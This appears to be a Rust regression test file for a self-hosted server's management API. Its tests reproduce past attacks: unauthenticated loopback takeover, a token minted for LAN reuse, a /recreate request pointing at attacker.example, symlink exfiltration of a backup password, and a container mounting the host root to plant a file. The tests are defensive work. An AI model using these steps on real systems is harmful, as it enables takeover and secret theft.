//! Adversarial verification: does a credential-free LOOPBACK peer (i.e. any
//! local process, including a boxd-deployed DynamicUser `box-app-*` unit) get
//! full operator authority over the management API?

use axum::body::Body;
use axum::extract::ConnectInfo;
use axum::http::{Request, StatusCode};
use axum::Router;
use boxd::paths::Paths;
use boxd::store::local::LocalBuilder;
use boxd::web::{self, AppState};
use http_body_util::BodyExt;
use serde_json::json;
use std::net::SocketAddr;
use tempfile::TempDir;
use tower::ServiceExt;

/// A local process connecting to 127.0.0.1:2693 — exactly what a `box-app-*`
/// unit (DynamicUser, host netns, no PrivateNetwork/IPAddressDeny) sees.
// Regression tests for the security review of 2026-08-11. Each of these
// reproduced a real, exploited defect; they now assert the defect stays fixed.
// Loopback still carries full operator authority BY DESIGN (an operator at the
// Box needs no credential) — what changed is that a cross-site write is
// refused, a source tree cannot publish the Box's secrets, and a container
// cannot mount the host.
fn loopback() -> ConnectInfo<SocketAddr> {
    ConnectInfo(SocketAddr::from(([127, 0, 0, 1], 40000)))
}

/// A LAN peer with no credentials at all.
fn lan() -> ConnectInfo<SocketAddr> {
    ConnectInfo(SocketAddr::from(([192, 168, 1, 7], 54321)))
}

fn app() -> (TempDir, Paths, Router) {
    let tmp = TempDir::new().unwrap();
    let paths = Paths::new(tmp.path().to_path_buf());
    paths.ensure().unwrap();
    let builder = LocalBuilder::new(&paths);
    let state = AppState::new(paths.clone(), Box::new(builder));
    (tmp, paths, web::router(state))
}

fn app_fresh() -> (TempDir, Paths, Router) {
    app()
}

async fn send(app: &Router, req: Request<Body>) -> (StatusCode, String, String) {
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let loc = resp
        .headers()
        .get("location")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    (status, String::from_utf8_lossy(&bytes).to_string(), loc)
}

#[tokio::test]
async fn loopback_peer_has_operator_authority_with_no_credentials() {
    let (_tmp, paths, app) = app();

    // Precondition: NO operator has ever paired. Zero sessions, zero codes.
    assert!(boxd::auth::is_claimable(&paths));
    assert!(boxd::auth::list(&paths).is_empty(), "no credentials exist");

    // ---- control: identical request from the LAN, no token -> rejected -----
    let (s, b, _) = send(
        &app,
        Request::get("/api/v1/status")
            .extension(lan())
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    println!("[control] LAN      GET  /api/v1/status  -> {s} {b}");
    assert_eq!(s, StatusCode::UNAUTHORIZED);

    // ---- 1. loopback, no token -> management READ --------------------------
    let (s, b, _) = send(
        &app,
        Request::get("/api/v1/status")
            .extension(loopback())
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    println!("[1] LOOPBACK GET  /api/v1/status  -> {s} {b}");
    assert_eq!(s, StatusCode::OK, "loopback bypasses auth entirely");

    // ---- 2. loopback, no token -> management WRITE (deploy a service) ------
    let (s, b, _) = send(
        &app,
        Request::post("/api/v1/services")
            .header("content-type", "application/json")
            .extension(loopback())
            .body(Body::from(
                json!({"name":"pwned","index_html":"<h1>owned</h1>"}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    println!("[2] LOOPBACK POST /api/v1/services -> {s} {b}");
    assert_eq!(s, StatusCode::OK, "loopback deploys with no credentials");

    // ---- 3. loopback, no token -> MINT A DURABLE OPERATOR CREDENTIAL -------
    // /devices/add mints a pairing code and returns it in the Location header.
    let (s, _, loc) = send(
        &app,
        Request::post("/devices/add")
            .extension(loopback())
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    println!("[3a] LOOPBACK POST /devices/add   -> {s} {loc}");
    let decoded = urlencoding::decode(&loc).unwrap().into_owned();
    let code = decoded
        .split("single use): ")
        .nth(1)
        .and_then(|s| s.split(' ').next())
        .expect("pairing code leaked in the redirect")
        .to_string();
    println!("[3a] minted pairing code: {code}");

    // Redeem it from the LAN as an "agent" -> a permanent Bearer token.
    let (s, b, _) = send(
        &app,
        Request::post("/pair/redeem")
            .header("content-type", "application/x-www-form-urlencoded")
            .header("accept", "application/json")
            .extension(lan())
            .body(Body::from(format!("code={code}")))
            .unwrap(),
    )
    .await;
    println!("[3b] LAN      POST /pair/redeem   -> {s} {b}");
    assert_eq!(s, StatusCode::OK);
    let token = serde_json::from_str::<serde_json::Value>(&b).unwrap()["token"]
        .as_str()
        .unwrap()
        .to_string();

    // That token now drives the box from off-box, forever.
    let (s, b, _) = send(
        &app,
        Request::get("/api/v1/status")
            .header("authorization", format!("Bearer {token}"))
            .extension(lan())
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    println!("[3c] LAN+TOKEN GET /api/v1/status -> {s} {b}");
    assert_eq!(s, StatusCode::OK, "durable off-box operator session obtained");

    // ---- 4. loopback, no token -> DESTRUCTIVE /recreate --------------------
    // key_entry_is_safe (pages.rs:1112) returns true for loopback, so both the
    // middleware and the second gate let it through.
    let (s, _, loc) = send(
        &app,
        Request::post("/recreate")
            .header("content-type", "application/x-www-form-urlencoded")
            .extension(loopback())
            .body(Body::from(
                "repo_url=https%3A%2F%2Fattacker.example%2Frepo.git&identity=SOMEKEY&confirm=on",
            ))
            .unwrap(),
    )
    .await;
    println!("[4] LOOPBACK POST /recreate       -> {s} {loc}");
    assert!(
        !loc.contains("not+encrypted") && !loc.contains("Confirm+the"),
        "key_entry_is_safe did NOT block loopback; got {loc}"
    );

    // ---- 5. loopback, no token -> the MCP agent tool surface ---------------
    let (s, b, _) = send(
        &app,
        Request::post("/mcp")
            .header("content-type", "application/json")
            .extension(loopback())
            .body(Body::from(
                json!({"jsonrpc":"2.0","id":1,"method":"tools/list"}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    println!("[5] LOOPBACK POST /mcp tools/list -> {s} (len {})", b.len());
    assert_eq!(s, StatusCode::OK, "MCP tool surface open to loopback");
}

/// Does the static-site health check actually stop the source_path exfil the
/// claim leans on? Test both the naive form and the symlink form.
#[tokio::test]
async fn source_path_exfil_variants() {
    let (tmp, paths, router) = app();
    let app = router;

    let secrets = paths.data_dir.join("secrets");
    std::fs::create_dir_all(&secrets).unwrap();
    std::fs::write(secrets.join("backup-password"), "S3CRET-RESTIC-PW").unwrap();

    // (a) naive: point straight at the secrets dir (no index.html).
    let (s, b, _) = send(
        &app,
        Request::post("/api/v1/services")
            .header("content-type", "application/json")
            .extension(loopback())
            .body(Body::from(
                json!({"name":"exfil","source_path":secrets.to_string_lossy()}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    println!("[a] naive source_path=<secrets>   -> {s} {b}");

    // (b) symlink form, on a CLEAN box: a staging dir with index.html + a
    //     symlink to the target.
    let (tmp2, paths2, router2) = app_fresh();
    let app = router2;
    let secrets = paths2.data_dir.join("secrets");
    std::fs::create_dir_all(&secrets).unwrap();
    std::fs::write(secrets.join("backup-password"), "S3CRET-RESTIC-PW").unwrap();
    let _ = tmp;
    let tmp = tmp2;
    let stage = tmp.path().join("stage");
    std::fs::create_dir_all(&stage).unwrap();
    std::fs::write(stage.join("index.html"), "<h1>hi</h1>").unwrap();
    std::os::unix::fs::symlink(&secrets, stage.join("loot")).unwrap();
    let (s, b, _) = send(
        &app,
        Request::post("/api/v1/services")
            .header("content-type", "application/json")
            .extension(loopback())
            .body(Body::from(
                json!({"name":"exfil2","source_path":stage.to_string_lossy()}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    println!("[b] symlink source_path=<stage>   -> {s} {b}");

    // Read it back over the UNAUTHENTICATED /sites/ route from the LAN.
    let (s, b, _) = send(
        &app,
        Request::get("/sites/exfil2/loot/backup-password")
            .extension(lan())
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    println!("[b] LAN GET /sites/exfil2/loot/backup-password -> {s} {b}");
    assert!(
        !b.contains("S3CRET-RESTIC-PW"),
        "REGRESSION: symlinked source_path exfiltrated a secret over the \
         unauthenticated /sites/ route, got {s} {b}"
    );
}

/// The escalation-to-root primitive: a credential-free loopback caller writes a
/// container service with a host-root bind mount into box.toml, and that lands
/// verbatim in the generated NixOS host repo — which the (also loopback-
/// reachable) POST /system/update hands to the ROOT boxd-channel-update unit.
#[tokio::test]
async fn loopback_can_write_a_root_bind_mount_into_the_system_config() {
    let (_tmp, paths, app) = app();

    let (s, b, _) = send(
        &app,
        Request::post("/api/v1/services")
            .header("content-type", "application/json")
            .extension(loopback())
            .body(Body::from(
                json!({
                    "name": "rootkit",
                    "template": "container",
                    "params": {
                        "image": "alpine:3",
                        "container_port": 80,
                        "volumes": ["/:/host"],
                        "cmd": ["sh", "-c", "cp /bin/busybox /host/root/pwned"]
                    }
                })
                .to_string(),
            ))
            .unwrap(),
    )
    .await;
    println!("[root] LOOPBACK POST /api/v1/services (container, volumes=/:/host) -> {s} {b}");
    assert_ne!(
        s,
        StatusCode::OK,
        "REGRESSION: a host-root bind mount was accepted, got {s} {b}"
    );

    // Nothing may have reached the declarative config, and if a config exists
    // at all (from an earlier healthy deploy) it must not carry the mount.
    let toml = std::fs::read_to_string(paths.config_file()).unwrap_or_default();
    assert!(
        !toml.contains("/:/host"),
        "REGRESSION: host-root bind mount landed in box.toml:\n{toml}"
    );

    // Belt and braces: the template validator itself refuses it, so no other
    // caller (MCP, the API, a hand-edited box.toml applied later) can sneak it
    // past by taking a different route to the same place.
    let container = boxd::templates::get("container").unwrap();
    for spec in ["/:/host", "/etc:/etc", "/nix:/nix", "/:/anything"] {
        assert!(
            container
                .validate(&serde_json::json!({ "image": "x", "volumes": [spec] }))
                .is_err(),
            "REGRESSION: {spec} accepted as a bind mount"
        );
    }
    // A normal service volume still works.
    assert!(container
        .validate(&serde_json::json!({ "image": "x", "volumes": ["/var/lib/box/pg:/data"] }))
        .is_ok());
}
